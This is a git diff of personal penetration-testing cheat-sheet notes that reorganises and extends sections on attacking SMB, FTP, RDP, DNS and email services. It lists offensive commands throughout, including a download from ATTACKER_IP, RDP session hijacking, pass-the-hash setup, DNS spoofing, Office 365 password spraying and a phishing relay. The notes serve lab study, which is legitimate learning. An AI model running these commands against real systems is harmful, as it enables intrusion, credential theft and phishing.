@@ -1,4 +1,3 @@
-
 - [Sysinternals](#sysinternals)
   - [Tools](#tools)
   - [Abusing Internals](#abusing-internals)
@@ -20,10 +19,6 @@
         - [MSSQL](#mssql)
   - [Powershell](#powershell)
     - [Enumeration](#enumeration)
-  - [SMB - 445](#smb---445)
-    - [SMBMAP](#smbmap)
-  - [FTP - 32](#ftp---32)
-- [RDP](#rdp)
 - [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
   - [GUI bypass](#gui-bypass)
   - [Auto Elevating](#auto-elevating)
@@ -40,6 +35,13 @@
   - [Privilege Escalation](#privilege-escalation)
     - [Incognito](#incognito)
     - [Potato family](#potato-family)
+- [Common Services](#common-services)
+  - [SMB - 445](#smb---445)
+    - [SMBMAP](#smbmap)
+  - [FTP - 32](#ftp---32)
+  - [RDP](#rdp)
+  - [DNS - 53](#dns---53)
+  - [Email service](#email-service)
 
 
 ## Sysinternals
@@ -596,8 +598,6 @@ EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmi
 
 - GUI: [dbeaver](https://github.com/dbeaver/dbeaver)
 
-
-
 ### Powershell
 - .NET framkework: software plattform für windows
 - Commands = cmdlets
@@ -680,124 +680,6 @@ EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmi
   - Get-ScheduledTask
 - Owner
   - Get-Acl
-
-### SMB - 445
-- Server Message BLock
-- share of files on the network
-- rpcclient '%' $TARGET
-  - enumdomusers, netshareenumall
-  - enum4linux $TARGET -A -C
-- Commands
-  - smbclient -L //$target/ = List Shares
-  - smbclient -L //$target -U admin/administrator
-  - smbclient //$target/Users = Interactive shell to a share 
-  - smbclient  \\\\$target\\share$ = Open a Null Session
-  - smbclient //friendzone.htb/general -U "" = see files inside
-  - smbclient -N -L //$target/ = List Shares as Null User
-  - smbmap -u Administrator -p 'Password@1' -H $target
-  - smbclient -U 'administrator%Password@1' \\\\\$target\\c$
-  - Nmap scripts
-    - smb-enum-users.nse
-    - smb-os-discovery
-    - smb-protocols
-    - smb-enum-shares
-    - smb-vuln*
-
-- Scripts
-  - smb-enum*
-  - smb-vuln*
-
-- Transfer files
-  - On attacking maching
-    - smbserver.py share .
-    - smbserver.py -smb2support -username USER -password PASS share /path/to/share/local
-  - On target
-    - net use \\AttackingIP\share
-    - net use x: \\IP\share /user:USER PASS = send to drive X:
-    - copy \\IP\\share\file.ext = fetch file
-    - 
-    - smbclient -U USER '//IP/folder'
-    - put file.name
-    - smbclient -c 'put pat.exe' -U USER -W ZA '//TARGET' PASSWORD
-
-- Use impacket
-```
-# create server
-sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password 1234567
-
-# Connect to the SMB server
-net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
-net use n: \\ATTACKER_IP\share /USER:user s3cureP@ssword 
-dir n: /a-d /s /b | find /c ":\\"= not directories, bare format | count
-dir n:\*cred* /s /b
-
-# Powershell
-## Create object credential
-$username = 'plaintext'
-$password = 'Password123'
-pass = convertto-securestring $password -asplain -force
-
-# Option 1
-$cred = new-object system.management.automation.pscredential('htb\john', $pass)
-
-# Option 2
-$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
-
-New-PSDrive -Name "N" -Root "\\Attacker\share" -PSProvider "FileSystem" -Credential $cred
-New-PSDrive -Name "N" -Root "\\ATTACKER_IP\share -PSProvider "FileSystem"
-
-# retrieve the files on the share
-copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
-
-# Disconnect server
-net use \\ATTACKER_IP\share /del
-```
-
-- **enum4linux**
-- [SMBGhost](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)
-
-
-#### SMBMAP
-- Default
-  - smbmap -H $target
-  
-- Enumerate
-  - -u USERNAME
-  - -r DiskName
-    - smbmap -H $target -r DiskName
-  - -u USER -H $target -r /ShareNAME/Folder
-  - -u "" -p "" = Null section
-  - -x COMMANDS
-- Download
-
-  - smbmap -u USER -H $target -r /ShareNAME/Folder ---download "share/file.ext"
-- Options
-  - -H: host
-  - -r: path
-  - -u: User
-  - -p: password
-
-### FTP - 32
-- ftp $TARGET
-  - mget | get
-  - mput | put
-
-- Bounce attack: deliver outbound traffic to anotehr device
-  - nmap -p 80 -b user:pass@$TARGET INTERNAL_IP
-
-```
-# CoreFTP attack
-curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
-```
-
-## RDP
-- Basic login
-  - xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]
-  - xfreerdp /v:IP /u:USERNAME /p:123456 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
-
-
-- Mount local folder:
-  - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 
 
 ## Bypass User Account Control (UAC)
 - New Process are runned as non-privileged-account
@@ -1103,3 +985,219 @@ $snap.LogPipelineExecutionDetails = $false
 - JuicyPotato
 	- [releases](https://github.com/ohpe/juicy-potato/releases)
 	- juicypotato.exe -l PORT -p REVSHELL.exe -t * -c {[FIND_CLSID](https://ohpe.it/juicy-potato/CLSID/)]}
+
+
+## Common Services
+
+### SMB - 445
+- Server Message BLock
+- share of files on the network
+- rpcclient '%' $TARGET
+  - enumdomusers, netshareenumall
+  - enum4linux $TARGET -A -C
+- Commands
+  - smbclient -L //$target/ = List Shares
+  - smbclient -L //$target -U admin/administrator
+  - smbclient //$target/Users = Interactive shell to a share 
+  - smbclient  \\\\$target\\share$ = Open a Null Session
+  - smbclient //friendzone.htb/general -U "" = see files inside
+  - smbclient -N -L //$target/ = List Shares as Null User
+  - smbmap -u Administrator -p 'Password@1' -H $target
+  - smbclient -U 'administrator%Password@1' \\\\\$target\\c$
+  - Nmap scripts
+    - smb-enum-users.nse
+    - smb-os-discovery
+    - smb-protocols
+    - smb-enum-shares
+    - smb-vuln*
+
+- Scripts
+  - smb-enum*
+  - smb-vuln*
+
+- Transfer files
+  - On attacking maching
+    - smbserver.py share .
+    - smbserver.py -smb2support -username USER -password PASS share /path/to/share/local
+  - On target
+    - net use \\AttackingIP\share
+    - net use x: \\IP\share /user:USER PASS = send to drive X:
+    - copy \\IP\\share\file.ext = fetch file
+    - 
+    - smbclient -U USER '//IP/folder'
+    - put file.name
+    - smbclient -c 'put pat.exe' -U USER -W ZA '//TARGET' PASSWORD
+
+- Use impacket
+```
+# create server
+sudo python3 /opt/impacket/examples/smbserver.py share . -smb2support -username user -password 1234567
+
+# Connect to the SMB server
+net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 
+net use n: \\ATTACKER_IP\share /USER:user s3cureP@ssword 
+dir n: /a-d /s /b | find /c ":\\"= not directories, bare format | count
+dir n:\*cred* /s /b
+
+# Powershell
+## Create object credential
+$username = 'plaintext'
+$password = 'Password123'
+pass = convertto-securestring $password -asplain -force
+
+# Option 1
+$cred = new-object system.management.automation.pscredential('htb\john', $pass)
+
+# Option 2
+$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
+
+New-PSDrive -Name "N" -Root "\\Attacker\share" -PSProvider "FileSystem" -Credential $cred
+New-PSDrive -Name "N" -Root "\\ATTACKER_IP\share -PSProvider "FileSystem"
+
+# retrieve the files on the share
+copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
+
+# Disconnect server
+net use \\ATTACKER_IP\share /del
+```
+
+- **enum4linux**
+- [SMBGhost](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-0796)
+
+
+#### SMBMAP
+- Default
+  - smbmap -H $target
+  
+- Enumerate
+  - -u USERNAME
+  - -r DiskName
+    - smbmap -H $target -r DiskName
+  - -u USER -H $target -r /ShareNAME/Folder
+  - -u "" -p "" = Null section
+  - -x COMMANDS
+- Download
+
+  - smbmap -u USER -H $target -r /ShareNAME/Folder ---download "share/file.ext"
+- Options
+  - -H: host
+  - -r: path
+  - -u: User
+  - -p: password
+
+### FTP - 32
+- ftp $TARGET
+  - mget | get
+  - mput | put
+
+- Bounce attack: deliver outbound traffic to anotehr device
+  - nmap -p 80 -b user:pass@$TARGET INTERNAL_IP
+
+```
+# CoreFTP attack
+curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
+```
+
+### RDP
+- TCP:3389
+- Spraying
+  - crowbar/hydra
+
+- rdesktop -u USER -p PASS $TARGET
+
+- Impersonate (within in the target)
+  - tscon.exe $TARGET_SESSION_ID /dest:$CURRENT_SESSIONS
+  - sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+  - net start sessionhijack
+
+- Basic login
+  - Disable restrcited admin mode: 
+    -  reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+  - xfreerdp /f /u:USERNAME /p:PASSWORD /v:HOST[:PORT]
+  - xfreerdp /v:IP /u:USERNAME /p:123456 +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
+    - hash: /pth:HASH
+
+- Mount local folder:
+  - xfreerdp /u:admin /p:password /cert:ignore /v:10.10.134.246 /workarea /drive:/home/bruno/git/tomnt +drives 
+  
+- Vuln:
+  - [CVE-2019-0708 - BlueKeep](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-0708)
+
+### DNS - 53
+- Tactic
+  - find all records
+  - zone transfer
+- UDP/53, TCP/53
+- Zone transfer
+  - copy portion of db to another server (tcp)
+  - dig axfr @dc01.name.local name.local
+    - dig axfr @target.local sub.location.local
+  - fierce --domain name.local
+- (Sub)Domain take over
+  - register non-existing to take control of aother
+  - [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) 
+- Enum subdomain
+  - [subdomainfinder](https://github.com/projectdiscovery/subfinder)
+    - subdomainfinder -d domain.local -v
+    - API key
+  - [subbrute](https://github.com/TheRook/subbrute)
+    - subbrute domain.local -s wordlist -r resolver
+      - -s list of subdomais
+      - -r resolver.txt
+- Spoofing/Cache poisoning
+  - change legite dns record with false info => redirect traffic
+- Local cache poisoning
+  - ettercap
+    - edit /etc/ettercap/etter.dns => map target domain
+
+```
+legit.domain      A   Attacker_IP
+*.legit.domain    A   Attacker_IP
+```
+    - Start ettercap
+      - Hosts > Scan for Hosts
+      - add: Target_IP Target1 + Default_gateway Target2
+      - dns_spoof: activate = Plugins > Manage Plugins
+  - bettercap
+  - [dnsrecon](https://securitytrails.com/blog/dnsrecon-tool)
+    - dns -d domain.local -D wordlist.txt -t brt/std/zonewalk/axfr
+
+### Email service
+- MX record
+- Ports: SMTP/25, IMAP4/143, POP3/110, SMTP/465, SMTP/587 (starttls), IMAP4/993, POP3/995
+  - nmap -sC -sV -p25,143,110,465,587,993,995 10.129.116.123
+- dig
+  - dig mx domain.htb 
+- host
+  - host -t MX domain.htb
+  - host -t A mail.domain.htb
+- [MXToolbox](https://mxtoolbox.com/)
+- Vuln
+  - anonymous authentication
+  - SMTP
+    - VRFY, EXPN, RCPT T => Enumerate
+      - VRFY: check email exists
+      - EXPN: all users in list
+      - RPCT TO: recipient of mail
+        - MAIL FROM: blabla@bla.de
+  - [POP3](https://www.shellhacks.com/retrieve-email-pop3-server-command-line/)
+    - USER name
+  
+- smpt-user-enum
+  - -M VRFY,EXPN, RCPT
+  - -U users.txt
+  - -D domain.htb
+  - -t target
+  
+- Cloud
+  - [o365spray](https://github.com/0xZDH/o365spray)
+    - o365spray --validate --domain domain.htb
+    - o365spray --enum -U users.txt --domain domain.htb
+    - o365spray --spray -U users.txt -p 'pass' --count 1 --lockout 1 --domain domain.htb
+
+- Open Relay
+  - unauthenticated relay
+  - phishing
+  - nmap --script smtp-open-relay
+  - swaks: SMTP test tool
+    - --from test@domain.htb --to targetemail@domain.htb --header 'subject: blabla' --body 'Click here' --server $TARGET
